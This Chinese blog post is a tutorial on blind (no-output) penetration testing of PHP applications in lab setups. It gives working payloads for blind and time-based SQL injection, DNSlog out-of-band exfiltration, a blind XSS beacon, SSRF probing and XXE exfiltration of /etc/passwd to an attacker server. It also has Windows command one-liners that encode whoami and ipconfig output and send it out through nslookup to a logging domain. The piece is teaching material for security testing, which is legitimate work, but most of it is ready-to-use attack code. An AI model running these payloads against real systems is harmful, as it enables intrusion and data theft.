---
title: PHP无回显渗透测试总结
tags: 
  - PHP
  - web安全
  - 无回显
  - 渗透测试
categories: web安全
keywords: 'web安全,无回显,PHP,渗透测试'
description: 关于一些PHP无回显的渗透测试总结
cover: /images/phpwhx.png
date: 2021-07-02 10:45:41
---

<meta name="referrer" content="no-referrer"/>

> 本文已发布到先知社区：https://xz.aliyun.com/t/9916
>
> 作者：ajie

# 0x01前言

在渗透测试过程中，开发不可能每一次都将结果输出到页面上，也就是漏洞无回显的情况，那么在这种情况下，我们可以通过dnslog判断漏洞存在，或者通过起一个python的http服务来判断，方法很多，下面主要进行一些情况的分析。
# 0x02无回显概念
无回显，即执行的payload在站点没有输出，无法进行进一步操作。在渗透测试过程中，漏洞点不可能总是能够在返回页面进行输出，那么这时候就需要进行一些无回显利用了。
# 0x03不同漏洞的无回显
## 1、SQL注入无回显
SQL注入，作为OWASP常年占据榜首位置的漏洞，在无回显中也是常见的。当然SQL注入在无回显上已经具有了一定的解决措施。
无回显我将其定义为页面没有输出我们想要得到的内容，下面以sqli-labs为例进行讲解。
### 1.1 布尔盲注
       布尔盲注，盲注的一种，当网站通过查询语句的布尔值返回真假来输出页面信息的时候，查询语句为真，页面输出内容；查询语句为假，页面不输出内容。那么这里就可以通过构造等号判断，获取相应的字符的ascii码，最后还原出数据。具体测试过程如下：
1、id传参1之后，页面返回有数据，这里明显不能进行显错注入了。
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505152244-ad7b9b8a-6ea0-4cdd-a3e0-0a5eb45ed92f.png#align=left&display=inline&height=156&margin=%5Bobject%2Object%5D&originHeight=315&originWidth=837&status=done&style=none&width=415)
2、在传参后面加个单引号，页面返回空，不显示错误信息，不能使用报错注入。
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505152514-71e97518-c208-4b9d-9a4e-61b1dcf4357f.png#align=left&display=inline&height=165&margin=%5Bobject%2Object%5D&originHeight=319&originWidth=802&status=done&style=none&width=415)
3、通过拼接and 1=1和and 1=2，发现页面对于布尔值的真与假返回的页面结果也不同。
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505152745-73cf1785-59ee-4551-9d74-7ba98d2cec44.png#align=left&display=inline&height=153&margin=%5Bobject%2Object%5D&originHeight=290&originWidth=790&status=done&style=none&width=416)
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505152244-ad7b9b8a-6ea0-4cdd-a3e0-0a5eb45ed92f.png#align=left&display=inline&height=156&margin=%5Bobject%2Object%5D&originHeight=315&originWidth=837&status=done&style=none&width=415)

4、通过length()函数判断数据库库名的长度大于1。
?id=1' and length(database())>1 %23
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505153079-ba58f545-ae61-431e-8818-bc12922659e2.png#align=left&display=inline&height=145&margin=%5Bobject%2Object%5D&originHeight=299&originWidth=856&status=done&style=none&width=415)
5、在大于8的时候页面返回空，所以数据库库名长度等于8。
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505153336-eed66eb5-75a1-4e17-b7fe-a758a9223de1.png#align=left&display=inline&height=146&margin=%5Bobject%2Object%5D&originHeight=299&originWidth=847&status=done&style=none&width=415)
6、通过ascii()函数和substr ()截取函数获取数据库库名的第一个字符的ascii码
?id=1' and ascii(substr((select database()),1,1))>97 %23
?id=1' and ascii(substr((select database()),1,1))=101 %23
首先用大于号判断出大概所处的值，最后使用等于号验证ascii码的值。此处得出数据库库名的第一个字符的ascii码值为115，对应字符为s。
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505153599-f01e6d2c-ae3c-4f6f-b9ea-1f7fe4b77bdc.png#align=left&display=inline&height=148&margin=%5Bobject%2Object%5D&originHeight=310&originWidth=871&status=done&style=none&width=415)
7、更改截取的位置，判断后面的字符对应的ascii码值。
?id=1' and ascii(substr((select database()),2,1))=101 %23
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505153874-95d56f80-1ac9-4a44-93a7-b4d8f7c63939.png#align=left&display=inline&height=147&margin=%5Bobject%2Object%5D&originHeight=287&originWidth=810&status=done&style=none&width=416)
### 1.2 延时盲注
       延时盲注，一种盲注的手法。在渗透测试过程中当我们不能使用显错注入、报错注入以及布尔盲注无论布尔值为真还是为假，页面都返回一样之后，我们可以尝试使用延时盲注，通过加载页面的时间长度来判断数据是否成功。在PHP中有一个if()函数，语法为if(exp1,exp2,exp3)，当exp1返回为真时，执行exp2，返回为假时，执行exp3。配合延时函数sleep()来获取相应数据的ascii码，最后还原成数据。下面我将通过实例来介绍如今进行延时盲注。
1、首先获取的页面如下，后面不论接上布尔值为真还是为假的，页面都返回一样，此时将不能使用布尔盲注。
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505154171-53cd2d36-c123-4091-ba74-fb80319ba1f9.png#align=left&display=inline&height=146&margin=%5Bobject%2Object%5D&originHeight=277&originWidth=785&status=done&style=none&width=415)
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505154477-058cbb12-c306-42db-8afd-7b9c0b26dd87.png#align=left&display=inline&height=154&margin=%5Bobject%2Object%5D&originHeight=295&originWidth=796&status=done&style=none&width=416)
2、通过and拼接延时函数查看页面是否有延时回显。首先记录没有使用延时函数的页面返回时间，为4.*秒；使用sleep(5)延时5秒之后，页面响应时间为9.*秒，说明对于我们输入的sleep()函数进行了延时处理，此处存在延时盲注。
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505154774-5573d6ac-4de8-4808-b813-7c983b1e63a3.png#align=left&display=inline&height=120&margin=%5Bobject%2Object%5D&originHeight=418&originWidth=1448&status=done&style=none&width=416)
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505155245-cac61cf1-0e9f-41cf-a967-182f57ac1554.png#align=left&display=inline&height=116&margin=%5Bobject%2Object%5D&originHeight=382&originWidth=1371&status=done&style=none&width=415)
3、通过延时注入判断数据库库名的长度。一个个测试发现当长度等于8时页面延时返回了，说明数据库库名长度为8。
?id=2' and if((length(database())=8),sleep(5),1) %23
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505155513-36485f8a-abee-4402-a197-44636b0a2f86.png#align=left&display=inline&height=167&margin=%5Bobject%2Object%5D&originHeight=434&originWidth=1081&status=done&style=none&width=415)
4、与布尔盲注一样，将子查询的数据截断之后判断ascii码，相等时延时5秒。最后得到第一个字符的ascii码为115。
?id=2' and if((ascii(substr((select database()),1,1))=115),sleep(5),1) %23
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505155940-da473dc6-2ac2-4ec1-b180-7c6456d0de47.png#align=left&display=inline&height=144&margin=%5Bobject%2Object%5D&originHeight=423&originWidth=1220&status=done&style=none&width=415)
5、后面替换截断的位置，测试后面的字符的ascii码值。最后得到对应的ascii码值为115 101 99 117 114 105 116 121。通过ascii解码工具解得数据库库名为security。
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505156315-650ab5b8-b418-4536-bc9e-ba70ca07f13c.png#align=left&display=inline&height=286&margin=%5Bobject%2Object%5D&originHeight=477&originWidth=666&status=done&style=none&width=400)
### 巧用dnslog进行SQL注入
       前面介绍了SQL注入中的盲注，通过布尔盲注或者延时盲注来获取数据需要的步骤非常繁琐，不仅需要一个一个字符的获取，最后还需要进行ascii解码，这需要花费大量的时间与精力。为了加快渗透进程，以及降低获取数据的难度，这里介绍如何通过dnslog进行SQL注入。
#### Dnslog
       dnslog，即dns日志，会解析访问dns服务的记录并显示出来，常被用来测试漏洞是否存在以及无法获取数据的时候进行外带数据。简单来说，dnslog就是一个服务器，会记录所有访问它的记录，包括访问的域名、访问的IP以及时间。那么我们就可以通过子查询，拼接dnslog的域名，最后通过dns日志得到需要的数据。
#### Load_file()函数
       数据库中的load_file()函数，可以加载服务器中的内容。load_file('c:/1.txt')，读取文件并返回内容为字符串，使用load_file()函数获取数据需要有以下几个条件：
       1.文件在服务器上
       2.指定完整路径的文件
       3.必须有FILE权限
#### UNC路径
       UNC路径就是类似\\softer这样的形式的网络路径。它符合 **\\服务器名\服务器资源**的格式。在Windows系统中常用于共享文件。如\\192.168.1.1\共享文件夹名。
#### Dnslog注入实例演示
1、打开实例站点，很明显这里是只能使用盲注的站点。
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505156851-edecb966-dc2b-46c0-bbba-280a9a6586f7.png#align=left&display=inline&height=205&margin=%5Bobject%2Object%5D&originHeight=516&originWidth=1046&status=done&style=none&width=415)
2、通过order by判断出字段数为3。
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505157359-df1d201d-8e3f-4ae7-abad-93e6f6a15a3a.png#align=left&display=inline&height=238&margin=%5Bobject%2Object%5D&originHeight=451&originWidth=785&status=done&style=none&width=415)
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505157735-72a8dfd4-3a1d-4bcb-a55f-ff7862eef954.png#align=left&display=inline&height=228&margin=%5Bobject%2Object%5D&originHeight=448&originWidth=814&status=done&style=none&width=415)
3、在dnslog网站申请一个dnslog域名：pcijrt.dnslog.cn
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505158068-3fd1f43e-d354-4c51-a466-2c88660f7ff9.png#align=left&display=inline&height=166&margin=%5Bobject%2Object%5D&originHeight=413&originWidth=1035&status=done&style=none&width=415)
4、通过load_file函数拼接查询数据库库名的子查询到dnslog的域名上，后面任意接一个不存在的文件夹名。最后将这个查询放到联合查询中，构造的payload如下：
```http
?id=1 ' union select 1,2,load_file(concat('//',(select database()),'.pcijrt.dnslog.cn
/abc')) %23
```
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505158457-b4c723f7-cdba-43c0-9fc4-5d284d9f1728.png#align=left&display=inline&height=144&margin=%5Bobject%2Object%5D&originHeight=413&originWidth=1189&status=done&style=none&width=415)
5、执行语句之后在dnslog日志中获取到数据库库名为security。
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505158874-723d612b-a6df-4d1d-a38b-98cf9036ddcb.png#align=left&display=inline&height=168&margin=%5Bobject%2Object%5D&originHeight=434&originWidth=1072&status=done&style=none&width=415)
6、修改子查询里的内容，获取其他数据。
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505159168-1cca463c-9c90-42db-822d-f944b8727a1f.png#align=left&display=inline&height=185&margin=%5Bobject%2Object%5D&originHeight=537&originWidth=1209&status=done&style=none&width=416)
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505159492-cc5dc626-b30c-4763-8fb0-f6285add8085.png#align=left&display=inline&height=166&margin=%5Bobject%2Object%5D&originHeight=490&originWidth=1227&status=done&style=none&width=415)


## 2、XSS无回显
XSS无回显比较特殊，一般XSS漏洞的判断标准为弹框，但是有这样一种情况，在一个表单提交处，内容提交之后只会在页面显示提交成功与否，不会输出提交的内容，那么我们也就无法通过弹框来判断XSS漏洞存在与否。这时候就需要通过XSS盲打来进行攻击。下面通过Pikachu漏洞练习平台来进行实例讲解：
### 2.1 XSS盲打
1、如图这里是一个提交看法的功能
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505159770-c89b0ec9-0436-4cf8-8f14-803ac998a67e.png#align=left&display=inline&height=171&margin=%5Bobject%2Object%5D&originHeight=500&originWidth=1217&status=done&style=none&width=415)
2、随便输入内容提交，告诉我们提交成功，没有将我输入的内容返回到页面中
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505160001-28ff893d-98ad-43cc-b6a4-3c8c2f982dc9.png#align=left&display=inline&height=207&margin=%5Bobject%2Object%5D&originHeight=345&originWidth=569&status=done&style=none&width=341)
3、登录后台可以看到确实有数据回显
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505160252-54df82c0-b513-4071-b4fa-8f2716f4514a.png#align=left&display=inline&height=82&margin=%5Bobject%2Object%5D&originHeight=317&originWidth=1617&status=done&style=none&width=416)
4、输入弹框语句会在后台成功执行
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505160525-58331697-af8f-4fe1-a420-f170f43cb0d6.png#align=left&display=inline&height=128&margin=%5Bobject%2Object%5D&originHeight=362&originWidth=1175&status=done&style=none&width=415)
5、在渗透测试过程中我们无法登录后台进行查看，那么就需要盲打XSS，输入XSS平台的payload，坐等管理员查看内容后上钩。
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505160770-d75465c1-9a36-4a5f-bb0f-0256f7108eea.png#align=left&display=inline&height=235&margin=%5Bobject%2Object%5D&originHeight=395&originWidth=699&status=done&style=none&width=415)
### 2.2 通过dnslog判断漏洞存在
```http
payload:
<img src=http://xss.t7y3wc.dnslog.cn>
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1626688564769-dcba54f1-6694-483e-bbb0-2ef4287b50e8.png#align=left&display=inline&height=294&margin=%5Bobject%2Object%5D&name=image.png&originHeight=588&originWidth=742&size=40726&status=done&style=none&width=371)
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1626688575999-b7c4d322-0f4c-49a4-9da1-496c6dbc6b13.png#align=left&display=inline&height=223&margin=%5Bobject%2Object%5D&name=image.png&originHeight=446&originWidth=1636&size=54194&status=done&style=none&width=818)
## 3、SSRF无回显
SSRF即服务端请求伪造，一种由攻击者构造的通过服务器发起请求的攻击。
测试代码如下：
```php
<?php 
	echo file_get_contents($_GET['url']);
?>
```
首先通过访问百度可以验证漏洞存在
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627011741087-fbffd788-bf83-4b17-90e6-c147539273c9.png#align=left&display=inline&height=343&margin=%5Bobject%2Object%5D&name=image.png&originHeight=686&originWidth=1722&size=49389&status=done&style=none&width=861)
无回显情况即不进行输出，页面返回空
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627011767609-826cc500-1e74-42fc-bb0a-e205fd70abb9.png#align=left&display=inline&height=112&margin=%5Bobject%2Object%5D&name=image.png&originHeight=224&originWidth=812&size=9552&status=done&style=none&width=406)
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627011778291-6d43af3c-3612-4913-a7a4-98d96252c5ee.png#align=left&display=inline&height=129&margin=%5Bobject%2Object%5D&name=image.png&originHeight=258&originWidth=1002&size=18063&status=done&style=none&width=501)
这种情况可以通过dnslog或者python搭建http服务验证
1、DNSLOG
[http://172.16.29.2/ssrf_test.php?url=http://ssrf.02c6ot.dnslog.cn](http://172.16.29.2/ssrf_test.php?url=http://ssrf.02c6ot.dnslog.cn)
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627011861845-ebd9644c-a3d9-4fbd-8777-4c96a1ce90f7.png#align=left&display=inline&height=179&margin=%5Bobject%2Object%5D&name=image.png&originHeight=358&originWidth=1518&size=40848&status=done&style=none&width=759)
2、python起的http服务

```php
python3 -m http.server 4545
```
[http://172.16.29.2/ssrf_test.php?url=http://172.16.29.1:4545](http://172.16.29.2/ssrf_test.php?url=http://172.16.29.1:4545)
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627011927228-dc71a133-b743-44db-83a8-7847879faffa.png#align=left&display=inline&height=136&margin=%5Bobject%2Object%5D&name=image.png&originHeight=272&originWidth=1076&size=19631&status=done&style=none&width=538)
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627011943684-3ba6d898-3620-4c3f-ade8-803b021288c7.png#align=left&display=inline&height=98&margin=%5Bobject%2Object%5D&name=image.png&originHeight=196&originWidth=1276&size=53498&status=done&style=none&width=638)

## 4、XXE无回显
因为XML是用来存储传输数据的，除了确实是业务需要，否则开发不可能会输出内容，也就是说你确实读取到了文件内容，但是没办法看到。XXE无回显问题当然也是可以通过在域名前面放入查询出的内容，将数据通过dns日志记录下来。
XXE虽然不是通过DNSlog，但是也同样是外带数据。
流程如下：
在受害者网站中，我们通过请求攻击者VPS上的1.xml文件，文件内容为将某数据放在GET传参中去访问2.php。然后2.php中的内容为保存GET传参的数据，将数据放入到3.txt中。
具体文件内容放在下面，里面的IP地址应该为攻击者的IP地址，这3个文件也是放在攻击者VPS上。
1.xml
```xml
<!ENTITY% all "<!ENTITY &#x25; send SYSTEM 'http://攻击者的IP地址/2.php?id=%file;'>">%all;
```
2.php
```php
<?php file_put_contents("3.txt",$_GET["id"],FILE_APPEND);?>
```
3.txt
```php
内容空
```


payload：
```xml
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % remote SYSTEM"http://服务器IP地址/xxe/1.xml">
%remote;
%send;
]>
```
## 5、命令执行无回显
简单的命令执行站点
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505161034-780f4d5e-9f34-4707-a863-eafbd9d39650.png#align=left&display=inline&height=97&margin=%5Bobject%2Object%5D&originHeight=162&originWidth=520&status=done&style=none&width=312)
输入任何命令都无回显
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505161304-f8990d48-cbc4-4e55-8e44-d70081631de0.png#align=left&display=inline&height=102&margin=%5Bobject%2Object%5D&originHeight=216&originWidth=876&status=done&style=none&width=415)
### 5.1 Dnslog判断漏洞存在
[http://127.0.0.1/test_blind/exec.php?cmd=ping+lhg3du.dnslog.cn](http://127.0.0.1/test_blind/exec.php?cmd=ping+lhg3du.dnslog.cn)
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505161596-6adcbdeb-489e-4552-be7c-a2a20628eaa6.png#align=left&display=inline&height=136&margin=%5Bobject%2Object%5D&originHeight=307&originWidth=940&status=done&style=none&width=415)
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505161819-5b984f68-02b5-49b7-94b5-73127adb26da.png#align=left&display=inline&height=190&margin=%5Bobject%2Object%5D&originHeight=479&originWidth=1046&status=done&style=none&width=415)
### 5.2Dnslog外带数据
#### 5.2.1 获取windows用户名
```http
http://127.0.0.1/test_blind/exec.php?cmd=ping+%USERNAME%.io5a5i.dnslog.cn
```
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505162343-fd422547-5db2-45b0-8264-c6a8b4324b2d.png#align=left&display=inline&height=163&margin=%5Bobject%2Object%5D&originHeight=430&originWidth=1093&status=done&style=none&width=415)
windows常用变量：
```
//变量                     类型       描述
//%ALLUSERSPROFILE%        本地       返回“所有用户”配置文件的位置。
//%APPDATA%                本地       返回默认情况下应用程序存储数据的位置。
//%CD%                     本地       返回当前目录字符串。
//%CMDCMDLINE%             本地       返回用来启动当前的 Cmd.exe 的准确命令行。
//%CMDEXTVERSION%          系统       返回当前的“命令处理程序扩展”的版本号。
//%COMPUTERNAME%           系统       返回计算机的名称。
//%COMSPEC%                系统       返回命令行解释器可执行程序的准确路径。
//%DATE%                   系统       返回当前日期。使用与 date /t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。
//%ERRORLEVEL%             系统       返回上一条命令的错误代码。通常用非零值表示错误。
//%HOMEDRIVE%              系统       返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
//%HOMEPATH%               系统       返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
//%HOMESHARE%              系统       返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
//%LOGONSERVER%            本地       返回验证当前登录会话的域控制器的名称。
//%NUMBER_OF_PROCESSORS%   系统       指定安装在计算机上的处理器的数目。
//%OS%                     系统       返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。
//%PATH%                   系统       指定可执行文件的搜索路径。
//%PATHEXT%                系统       返回操作系统认为可执行的文件扩展名的列表。
//%PROCESSOR_ARCHITECTURE% 系统       返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。
//%PROCESSOR_IDENTFIER%    系统       返回处理器说明。
//%PROCESSOR_LEVEL%        系统       返回计算机上安装的处理器的型号。
//%PROCESSOR_REVISION%     系统       返回处理器的版本号。
//%PROMPT%                 本地       返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。
//%RANDOM%                 系统       返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。
//%SYSTEMDRIVE%            系统       返回包含 Windows server operating system 根目录（即系统根目录）的驱动器。
//%SYSTEMROOT%             系统       返回 Windows server operating system 根目录的位置。
//%TEMP%和%TMP%            系统和用户 返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。
//%TIME%                   系统       返回当前时间。使用与                                                                                   time       /t                                                                     命令相同的格式。由         Cmd.exe                  生成。有关                       time   命令的详细信息，请参阅 Time。
//%USERDOMAIN%             本地       返回包含用户帐户的域的名称。
//%USERNAME%               本地       返回当前登录的用户的名称。
//%USERPROFILE%            本地       返回当前用户的配置文件的位置。
//%WINDIR%                 系统       返回操作系统目录的位置。
```
#### 5.2.2 其他命令执行
```http
cmd /c whoami > temp && certutil -encode -f temp temp&&FOR /F "eol=- delims=" %i IN (temp) DO (set _=%i & cmd /c nslookup %_:~0,-1%.xxxx.ceye.io)&del temp
```

```http
cmd /c ipconfig > temp && certutil -encode -f temp temp&&FOR /F "eol=- delims=" %i IN (temp) DO (set _=%i & cmd /c nslookup %_:~0,40%.xxxx.ceye.io & cmd /c nslookup %_:~40,-1%.xxxx.ceye.io)&del temp
```

通过POST传参测试
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505162550-1ce46dae-aed3-4995-9021-f8a247144874.png#align=left&display=inline&height=95&margin=%5Bobject%2Object%5D&originHeight=159&originWidth=414&status=done&style=none&width=248)
传参的内容需要进行url编码
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505162770-391b3b8d-9947-440a-9529-5004a5bbd534.png#align=left&display=inline&height=118&margin=%5Bobject%2Object%5D&originHeight=431&originWidth=1521&status=done&style=none&width=415)
Post传参
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505163079-b19d4b32-222e-4b37-ab74-a88964a3839b.png#align=left&display=inline&height=138&margin=%5Bobject%2Object%5D&originHeight=407&originWidth=1226&status=done&style=none&width=416)
Dnslog获取结果
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505163323-d049cc56-b450-4492-8ee3-434865c75b6c.png#align=left&display=inline&height=170&margin=%5Bobject%2Object%5D&originHeight=465&originWidth=1135&status=done&style=none&width=415)
Base64解码获取内容
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505163685-f6a56798-fc6e-4dd3-8f6b-520b6a7efd23.png#align=left&display=inline&height=229&margin=%5Bobject%2Object%5D&originHeight=382&originWidth=648&status=done&style=none&width=389)

## 总结
       在渗透测试过程中，无回显是很常见的，程序不可能将一些操作都回显到页面中，那么这种时候我们就需要外带数据来获取想要的内容。当然最好就是能够反弹shell，通过获取shell来执行命令，这样会舒服很多。
       无回显的情况还有很多很多，这里简单介绍了几种，希望读者朋友们能够从中学到对于无回显的情况下如何进行渗透测试，方法很多，不固定，学习思路即可。
